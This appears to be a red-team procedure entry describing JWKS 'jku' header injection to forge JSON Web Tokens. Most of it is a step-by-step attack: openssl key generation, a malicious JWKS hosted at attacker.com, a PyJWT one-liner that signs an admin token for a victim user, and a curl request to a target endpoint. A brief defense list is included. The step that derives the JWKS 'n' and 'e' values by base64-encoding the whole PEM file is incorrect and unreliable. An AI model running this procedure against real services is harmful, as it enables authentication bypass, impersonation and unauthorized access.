---
id: ebaa8c52-cc54-44d0-8610-db22a9b1e54b
name: JWKS-Key-Injection-for-JWT-Forgery
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:00.822697+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Application Access Token]]'
sub_techniques: []
tags:
  - jwks
  - jwt
  - key-injection
  - auth-bypass
  - token-forgery
commands:
  - '[[commands/openssl-generate-rsa-private-key]]'
  - '[[commands/openssl-extract-rsa-public-key]]'
  - '[[commands/create-jwt-with-jku-header]]'
  - '[[commands/host-jwks-file-locally]]'
platforms:
  - Web
tools:
  - '[[tools/openssl]]'
  - '[[tools/Python]]'
validated: true
---

# JWKS-Key-Injection-for-JWT-Forgery

## Summary

JWKS Key Injection is a JWT manipulation technique where an attacker injects a malicious URL into the 'jku' (JSON Web Key Set) header of a token. This URL points to an attacker-controlled JWKS file containing a public key paired with the attacker's private key. The target service fetches the public key from the injected URL and uses it to verify the token, allowing the attacker to forge valid tokens for authentication bypass and unauthorized access.

## Description

This procedure targets applications that validate JWTs using remote JWKS endpoints without proper URL validation. By controlling the 'jku' header, attackers can redirect key retrieval to their server, enabling token signing with arbitrary credentials. It is effective against APIs or services using libraries like jsonwebtoken (Node.js) or PyJWT (Python) that support 'jku' without restrictions. The attack assumes the service accepts 'jku' headers and does not whitelist domains. Successful execution impersonates users, accesses protected resources, or escalates privileges in web applications.

## Requirements

1. Knowledge of the target's JWT structure (algorithm, claims, kid) from intercepted legitimate tokens.
2. Access to an attacker-controlled server to host the malicious JWKS file.
3. Tools for key generation (OpenSSL) and JWT creation (Python with PyJWT).
4. Network access to submit forged tokens to the target service.
5. Basic understanding of JWT format and base64url encoding.

## Defense

Defensive measures and detection strategies:

- Disable or restrict 'jku' header support; use local key storage or hardcoded JWKS endpoints.
- Validate and whitelist allowed domains for 'jku' URLs to prevent external fetches.
- Implement certificate pinning or HSM for key management to avoid remote retrieval.
- Monitor for anomalous 'jku' headers in logs and block requests with unexpected URLs.
- Use short-lived tokens and require additional factors beyond JWT validation.

## Objectives

1. Generate an attacker-controlled RSA key pair for signing and verification.
2. Create and host a malicious JWKS file with the public key.
3. Forge a JWT token with an injected 'jku' header pointing to the malicious JWKS.
4. Submit the forged token to bypass authentication and access restricted resources.

## Instructions

### Step 1: Generate RSA Key Pair

**Context**: Create a private key for signing the JWT and a corresponding public key to include in the JWKS. This ensures the target can verify the token using the attacker's public key.

**Command** ([[commands/openssl-generate-rsa-private-key]]):
```bash
openssl genrsa -out private_key.pem 2048
```

> This generates a 2048-bit RSA private key. Then extract the public key using [[commands/openssl-extract-rsa-public-key]]:

**Command** ([[commands/openssl-extract-rsa-public-key]]):
```bash
openssl rsa -in private_key.pem -pubout -out public_key.pem
```

> Expected output is a PEM-formatted public key file. Verify with `openssl rsa -in public_key.pem -pubin -text -noout` to confirm modulus (n) and exponent (e) match the JWKS format.

### Step 2: Create Malicious JWKS File

**Context**: Format the public key into a JWKS JSON structure. Use a unique 'kid' to match the token's header, tricking the service into using this key for verification.

Embed the [[codes/Malicious-JWKS-JSON-File]] code snippet into a file named `malicious_jwks.json` on your server. Replace the 'n' and 'e' values with base64url-encoded components from your public key (use tools like `python -c "import base64; print(base64.urlsafe_b64encode(open('public_key.pem', 'rb').read()))"` to encode).

> Expected output: A valid JSON file hosted at a URL like http://attacker.com/malicious_jwks.json. Test accessibility with curl: `curl http://attacker.com/malicious_jwks.json` should return the JSON without errors.

### Step 3: Host the JWKS File

**Context**: Serve the JWKS file from an attacker-controlled endpoint accessible by the target service. Use a simple HTTP server to mimic a legitimate key endpoint.

**Command** ([[commands/host-jwks-file-locally]]):
```bash
python -m http.server 80 --directory /path/to/jwks/
```

> This starts a Python HTTP server on port 80. Ensure the firewall allows inbound traffic and the URL is publicly resolvable (use ngrok if behind NAT). Expected output: Server logs showing GET requests when the target fetches the JWKS.

### Step 4: Forge and Sign the JWT

**Context**: Create a JWT with the injected 'jku' header pointing to your hosted JWKS, sign it with the private key, and set claims to impersonate a target user (e.g., admin role).

**Command** ([[commands/create-jwt-with-jku-header]]):
```python
python3 -c "import jwt; private_key = open('private_key.pem').read(); headers = {'jku': 'http://attacker.com/malicious_jwks.json', 'kid': 'beaefa6f-8a50-42b9-805a-0ab63c3acc54', 'alg': 'RS256'}; payload = {'sub': 'victim@example.com', 'role': 'admin'}; token = jwt.encode(payload, private_key, algorithm='RS256', headers=headers); print(token)"
```

> Requires PyJWT: `pip install pyjwt[crypto]`. Expected output: A base64url-encoded JWT string. Decode at jwt.io to verify headers include the malicious 'jku' and payload has desired claims.

### Step 5: Submit Forged Token

**Context**: Intercept or replay the JWT in requests to the target service (e.g., via Authorization: Bearer header). Use Burp Suite or curl to test validation.

Use curl to send the token:
```bash
curl -H "Authorization: Bearer YOUR_FORGED_TOKEN" https://target.com/protected-endpoint
```

> Expected output: Successful response (e.g., 200 OK) with access to restricted data, indicating bypass. If rejected, check logs for JWKS fetch errors or invalid signature.
